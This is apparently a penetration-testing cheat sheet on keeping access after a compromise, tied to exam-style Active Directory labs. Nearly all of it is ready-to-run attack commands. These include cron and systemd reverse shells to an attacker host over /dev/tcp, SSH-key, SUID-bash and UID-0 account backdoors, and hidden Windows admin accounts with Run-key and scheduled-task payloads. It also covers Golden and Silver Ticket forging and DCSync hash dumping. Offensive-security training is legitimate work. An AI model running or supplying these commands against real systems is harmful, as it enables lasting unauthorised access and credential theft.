# Persistence Techniques

Maintaining access after initial compromise. Critical for AD sets where you pivot across machines.

---

## LINUX PERSISTENCE

### SSH key backdoor

Add your SSH key to a user — Survive password changes and reboots

```bash
# Generate key on attacker:
ssh-keygen -f backdoor_key -t rsa -N ""

# On target (as root or target user):
mkdir -p /home/user/.ssh
echo "ssh-rsa AAAA... your_key" >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys

# Connect:
ssh -i backdoor_key user@$IP
```

---

### Cron job backdoor

Schedule a reverse shell — Reconnects every minute

```bash
# As root:
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/$LHOST/4444 0>&1") | crontab -

# Or write to cron directory:
echo '* * * * * root bash -i >& /dev/tcp/$LHOST/4444 0>&1' > /etc/cron.d/backdoor
```

---

### SUID bash backdoor

Copy bash with SUID bit — Instant root anytime

```bash
# As root:
cp /bin/bash /tmp/.backdoor
chmod +s /tmp/.backdoor

# Later (as any user):
/tmp/.backdoor -p
# -p preserves SUID = root shell
```

---

### Add user with root privileges

Create a backup admin account — Last resort persistence

```bash
# Add user with UID 0:
echo 'backdoor:$(openssl passwd -1 password123):0:0::/root:/bin/bash' >> /etc/passwd

# Or with useradd:
useradd -ou 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
```

---

### Modify existing service

Backdoor an init script or systemd service — Runs on boot

```bash
# Systemd:
cat > /etc/systemd/system/backdoor.service << UNIT
[Unit]
Description=System Monitor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
UNIT
systemctl enable backdoor.service
systemctl start backdoor.service
```

---

## WINDOWS PERSISTENCE

### Registry Run Keys

Execute payload on user login — Survives reboots

```bash
# Current user:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe"

# All users (needs admin):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe"
```

---

### Scheduled task persistence

Create task that runs on login or at interval — Runs as SYSTEM

```bash
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM
```

---

### New local admin user

Create a hidden admin account — Quick re-entry

```bash
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Hide from login screen (optional):
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0
```

---

### RDP enable

Turn on RDP for persistent GUI access — If not already enabled

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
# Connect: xfreerdp /u:user /p:pass /v:$IP
```

---

### WinRM enable

Enable WinRM for persistent shell access — PowerShell remoting

```bash
Enable-PSRemoting -Force
winrm quickconfig -q
# Connect: evil-winrm -i $IP -u user -p 'password'
```

---

## AD PERSISTENCE

### Golden Ticket

Forge TGT with krbtgt hash — Persist as any user indefinitely

```bash
# After DCSync:
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local administrator
# Valid for 10 years by default
```

---

### DCSync for all hashes

Dump every hash in the domain — Can re-compromise anything

```bash
impacket-secretsdump domain.local/admin:'Password1'@$DC_IP
# Save output — these hashes let you PtH to any machine
```

---

### Add user to Domain Admins

Direct group manipulation — If you have the rights

```bash
net group "Domain Admins" backdoor /add /domain
# Or with PowerView:
Add-DomainGroupMember -Identity "Domain Admins" -Members "backdoor"
```

---

### Silver Ticket for specific service

Forge service ticket — Access one service indefinitely

```bash
# Useful when you need persistent access to one machine's CIFS/HTTP/etc
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

---

## WHEN TO USE PERSISTENCE

```
Engagement Scenario → Persistence Method
─────────────────────────────────────────
Single Linux box      → SSH key + SUID bash
Single Windows box    → Scheduled task + new admin user
AD: Need to pivot     → Add creds to multiple machines
AD: Post-DA           → Golden Ticket + DCSync dump
Exam: AD set          → Keep creds documented, WinRM/RDP enabled
```

---
